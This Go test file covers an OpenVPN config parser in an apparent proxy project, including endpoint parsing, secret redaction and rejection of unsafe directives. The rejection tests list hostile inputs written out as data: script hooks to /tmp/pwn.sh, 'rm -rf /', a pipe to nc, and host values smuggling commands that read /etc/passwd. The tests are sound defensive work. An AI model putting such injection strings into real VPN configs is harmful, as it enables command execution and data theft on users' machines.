package discovery

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"

	"github.com/NaNA1337/super-proxy/internal/models"
)

func TestParseOpenVPNConfig_ValidSingleRemote(t *testing.T) {
	cfg := `
dev tun
proto udp
remote 198.51.100.1 1194
cipher AES-256-CBC
auth SHA256
remote-cert-tls server
`
	b64 := base64.StdEncoding.EncodeToString([]byte(cfg))

	safeStr, meta, err := ParseOpenVPNConfig(b64)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Verify safe configuration contains canonical safe directives
	if !strings.Contains(safeStr, "client\n") {
		t.Errorf("expected generated safe config to contain 'client'")
	}
	if !strings.Contains(safeStr, "route-nopull\n") {
		t.Errorf("expected generated safe config to contain 'route-nopull'")
	}
	if !strings.Contains(safeStr, "nobind\n") {
		t.Errorf("expected generated safe config to contain 'nobind'")
	}
	if !strings.Contains(safeStr, "remote 198.51.100.1 1194\n") {
		t.Errorf("expected remote in safe config: %s", safeStr)
	}

	if meta.Dev != "tun" {
		t.Errorf("expected dev tun, got %s", meta.Dev)
	}
	if meta.Cipher != "AES-256-CBC" {
		t.Errorf("expected cipher AES-256-CBC, got %s", meta.Cipher)
	}
	if meta.Auth != "SHA256" {
		t.Errorf("expected auth SHA256, got %s", meta.Auth)
	}
	if meta.RemoteCertTLS != "server" {
		t.Errorf("expected remote-cert-tls server, got %s", meta.RemoteCertTLS)
	}
	if len(meta.Endpoints) != 1 {
		t.Fatalf("expected 1 endpoint, got %d", len(meta.Endpoints))
	}
	ep := meta.Endpoints[0]
	if ep.Host != "198.51.100.1" || ep.Port != 1194 || ep.Proto != "udp" {
		t.Errorf("unexpected endpoint: %+v", ep)
	}
	if meta.PrimaryEndpoint != ep {
		t.Errorf("primary endpoint mismatch: %+v vs %+v", meta.PrimaryEndpoint, ep)
	}
}

func TestParseOpenVPNConfig_MultipleRemotesAndPriority(t *testing.T) {
	cfg := `
dev tun0
dev-type tun
proto tcp-client
port 443
remote 198.51.100.2
remote vpn.example.com 8443
remote 2001:db8::1 1194 udp
cipher AES-128-GCM
data-ciphers AES-256-GCM:AES-128-GCM
verify-x509-name vpn-server name
`
	b64 := base64.StdEncoding.EncodeToString([]byte(cfg))

	_, meta, err := ParseOpenVPNConfig(b64)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if meta.DevType != "tun" {
		t.Errorf("expected dev-type tun, got %s", meta.DevType)
	}
	if meta.DataCiphers != "AES-256-GCM:AES-128-GCM" {
		t.Errorf("expected data-ciphers, got %s", meta.DataCiphers)
	}
	if meta.VerifyX509Name != "vpn-server name" {
		t.Errorf("expected verify-x509-name, got %s", meta.VerifyX509Name)
	}

	if len(meta.Endpoints) != 3 {
		t.Fatalf("expected 3 endpoints, got %d", len(meta.Endpoints))
	}

	// 1st remote: 198.51.100.2 -> inherits global port 443, global proto tcp
	if meta.Endpoints[0].Host != "198.51.100.2" || meta.Endpoints[0].Port != 443 || meta.Endpoints[0].Proto != "tcp" {
		t.Errorf("remote 1 mismatch: %+v", meta.Endpoints[0])
	}
	// 2nd remote: vpn.example.com 8443 -> inherits global proto tcp
	if meta.Endpoints[1].Host != "vpn.example.com" || meta.Endpoints[1].Port != 8443 || meta.Endpoints[1].Proto != "tcp" {
		t.Errorf("remote 2 mismatch: %+v", meta.Endpoints[1])
	}
	// 3rd remote: 2001:db8::1 1194 udp -> explicit port 1194 and proto udp
	if meta.Endpoints[2].Host != "2001:db8::1" || meta.Endpoints[2].Port != 1194 || meta.Endpoints[2].Proto != "udp" {
		t.Errorf("remote 3 mismatch: %+v", meta.Endpoints[2])
	}

	// Primary endpoint must be the first in configuration order
	if meta.PrimaryEndpoint != meta.Endpoints[0] {
		t.Errorf("expected primary endpoint to be endpoints[0]")
	}
}

func TestParseOpenVPNConfig_InlineCertificatesSafeExtraction(t *testing.T) {
	cfg := `
dev tun
proto udp
remote 198.51.100.1 1194
<ca>
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJALm7F3A5nJ0tMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
-----END CERTIFICATE-----
</ca>
<cert>
-----BEGIN CERTIFICATE-----
MIIDRjCCAi6gAwIBAgIBAjANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJKUDEO
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Yh0PqR3
-----END RSA PRIVATE KEY-----
</key>
`
	b64 := base64.StdEncoding.EncodeToString([]byte(cfg))

	safeCfg, _, safeStr, err := ParseSafeOpenVPNConfig(b64)
	if err != nil {
		t.Fatalf("unexpected error parsing inline certs: %v", err)
	}

	if !strings.Contains(safeCfg.InlineCA, "MIIDXTCCAkWgAwIBAgIJALm7F3A5nJ0tMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV") {
		t.Errorf("CA certificate extraction failed")
	}
	if !strings.Contains(safeCfg.InlineCert, "MIIDRjCCAi6gAwIBAgIBAjANBgkqhkiG9w0BAQsFADBFMQswCQYDVQQGEwJKUDEO") {
		t.Errorf("Client certificate extraction failed")
	}
	if !strings.Contains(safeCfg.InlineKey, "MIIEowIBAAKCAQEA0Yh0PqR3") {
		t.Errorf("Key extraction failed")
	}

	// Verify generated safe config embeds certificates properly
	if !strings.Contains(safeStr, "<ca>\n-----BEGIN CERTIFICATE-----") {
		t.Errorf("missing <ca> in generated config: %s", safeStr)
	}
}

func TestParseOpenVPNConfig_MaliciousDirectivesStrictlyRejected(t *testing.T) {
	maliciousCases := []struct {
		name      string
		directive string
	}{
		{"up script", "up /tmp/pwn.sh"},
		{"down script", "down /tmp/pwn.sh"},
		{"route-up script", "route-up /tmp/pwn.sh"},
		{"route-pre-down", "route-pre-down /tmp/pwn.sh"},
		{"plugin injection", "plugin /tmp/pwn.so"},
		{"tls-verify script", "tls-verify /tmp/pwn.sh"},
		{"auth-user-pass-verify", "auth-user-pass-verify /tmp/pwn.sh via-env"},
		{"client-connect script", "client-connect /tmp/pwn.sh"},
		{"client-disconnect script", "client-disconnect /tmp/pwn.sh"},
		{"learn-address script", "learn-address /tmp/pwn.sh"},
		{"management port", "management 127.0.0.1 9999"},
		{"management-client", "management-client"},
		{"script-security 2", "script-security 2"},
		{"system directive", "system echo pwn"},
		{"setenv injection", "setenv FOO bar"},
		{"setenv-safe injection", "setenv-safe FOO bar"},
		{"exec directive", "exec /tmp/pwn.sh"},
		{"argument injection --", "--script-security 2"},
		{"shell semicolon", "proto udp; rm -rf /"},
		{"shell backtick", "dev `id`"},
		{"shell pipe", "auth SHA256 | nc 1.2.3.4 9999"},
		{"custom route directive", "route 10.0.0.0 255.0.0.0 1.2.3.4"},
		{"route-ipv6 directive", "route-ipv6 2001:db8::/32"},
		{"user change", "user nobody"},
		{"group change", "group nogroup"},
		{"chroot directive", "chroot /tmp"},
		{"unauthorized tag", "<evil>\nrm -rf /\n</evil>"},
	}

	for _, tc := range maliciousCases {
		t.Run(tc.name, func(t *testing.T) {
			cfg := "remote 198.51.100.1 1194\n" + tc.directive + "\n"
			b64 := base64.StdEncoding.EncodeToString([]byte(cfg))

			_, _, err := ParseOpenVPNConfig(b64)
			if err == nil {
				t.Fatalf("SECURITY FAILURE: expected rejection for %q, but config was ACCEPTED", tc.directive)
			}
		})
	}
}

func TestParseOpenVPNConfig_RejectionCases(t *testing.T) {
	cases := []struct {
		name   string
		input  string
		errMsg string
	}{
		{
			name:   "empty config",
			input:  "",
			errMsg: "openvpn config data is empty",
		},
		{
			name:   "invalid base64",
			input:  "not_base64_!@#$%",
			errMsg: "failed to decode base64",
		},
		{
			name:   "empty decoded string",
			input:  base64.StdEncoding.EncodeToString([]byte("   \n\n\t  ")),
			errMsg: "decoded openvpn config is empty",
		},
		{
			name:   "missing remote directive",
			input:  base64.StdEncoding.EncodeToString([]byte("dev tun\nproto udp\nport 1194\n")),
			errMsg: "no valid remote endpoints found",
		},
		{
			name:   "invalid port",
			input:  base64.StdEncoding.EncodeToString([]byte("remote 1.2.3.4 999999\n")),
			errMsg: "no valid remote endpoints found",
		},
		{
			name:   "invalid proto",
			input:  base64.StdEncoding.EncodeToString([]byte("remote 1.2.3.4 1194 sctp\n")),
			errMsg: "no valid remote endpoints found",
		},
		{
			name:   "malicious shell injection host",
			input:  base64.StdEncoding.EncodeToString([]byte("remote 1.2.3.4;rm -rf / 1194\n")),
			errMsg: "forbidden metacharacter",
		},
		{
			name:   "malicious backtick host",
			input:  base64.StdEncoding.EncodeToString([]byte("remote `whoami`.evil.com 1194\n")),
			errMsg: "forbidden metacharacter",
		},
		{
			name:   "malicious pipe host",
			input:  base64.StdEncoding.EncodeToString([]byte("remote 1.2.3.4|cat /etc/passwd 1194\n")),
			errMsg: "forbidden metacharacter",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, _, err := ParseOpenVPNConfig(tc.input)
			if err == nil {
				t.Fatalf("expected error for case %q, got nil", tc.name)
			}
			if !strings.Contains(err.Error(), tc.errMsg) {
				t.Errorf("expected error to contain %q, got %q", tc.errMsg, err.Error())
			}
		})
	}
}

func TestStripSecrets_RedactsAllSensitiveMaterial(t *testing.T) {
	rawWithSecrets := `
client
dev tun
proto udp
remote 198.51.100.1 1194
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQD...SUPER_SECRET_KEY...
-----END PRIVATE KEY-----
</key>
<tls-auth>
-----BEGIN OpenVPN Static key V1-----
abc123secretkey456
-----END OpenVPN Static key V1-----
</tls-auth>
<tls-crypt>
secret_crypt_key
</tls-crypt>
`

	sanitized := StripSecrets(rawWithSecrets)

	if strings.Contains(sanitized, "SUPER_SECRET_KEY") {
		t.Fatalf("CRITICAL LEAK: sanitized config still contains raw private key!")
	}
	if strings.Contains(sanitized, "abc123secretkey456") {
		t.Fatalf("CRITICAL LEAK: sanitized config still contains tls-auth secret!")
	}
	if strings.Contains(sanitized, "secret_crypt_key") {
		t.Fatalf("CRITICAL LEAK: sanitized config still contains tls-crypt secret!")
	}
	if !strings.Contains(sanitized, "[PRIVATE KEY REDACTED]") {
		t.Errorf("expected [PRIVATE KEY REDACTED] placeholder in sanitized config")
	}
	if !strings.Contains(sanitized, "[TLS-AUTH REDACTED]") {
		t.Errorf("expected [TLS-AUTH REDACTED] placeholder in sanitized config")
	}
}

func TestNodeJSON_NeverLeaksPrivateKeyOrRawConfig(t *testing.T) {
	node := &models.Node{
		ID:            "198.51.100.1",
		IP:            "198.51.100.1",
		OpenVPN:       "SGVsbG8gV29ybGQgLSBSQVcgQ09ORklHIENPTlRBSU5JTkcgUFJJVkFURSBLRVk=", // Base64 raw
		OpenVPNConfig: "<key>\n[PRIVATE KEY REDACTED]\n</key>",
	}

	jsonData, err := json.Marshal(node)
	if err != nil {
		t.Fatalf("failed to marshal node: %v", err)
	}

	jsonStr := string(jsonData)

	// 1. Raw base64 config must NEVER appear in JSON (due to json:"-")
	if strings.Contains(jsonStr, "SGVsbG8gV29ybGQ") {
		t.Fatalf("CRITICAL LEAK: Node JSON contains raw OpenVPN Base64 config!")
	}
	if strings.Contains(jsonStr, "openvpn_config_base64") {
		t.Fatalf("CRITICAL LEAK: openvpn_config_base64 field present in Node JSON!")
	}

	// 2. Private key text must not be present
	if strings.Contains(jsonStr, "-----BEGIN PRIVATE KEY-----") {
		t.Fatalf("CRITICAL LEAK: Node JSON contains actual private key block!")
	}
}

func TestVPNGatePersistenceFlagsAreAcceptedButNotForwarded(t *testing.T) {
	raw := "client\ndev tun\nproto tcp\nremote 203.0.113.10 443\npersist-key\npersist-tun\ncipher AES-128-CBC\ndata-ciphers AES-128-CBC\nauth SHA1\n"
	safe, meta, err := ParseOpenVPNConfig(base64.StdEncoding.EncodeToString([]byte(raw)))
	if err != nil {
		t.Fatal(err)
	}
	if meta.PrimaryEndpoint.Port != 443 || strings.Contains(safe, "persist-") || !strings.Contains(safe, "route-nopull") {
		t.Fatalf("unexpected canonical config: %s", safe)
	}
}
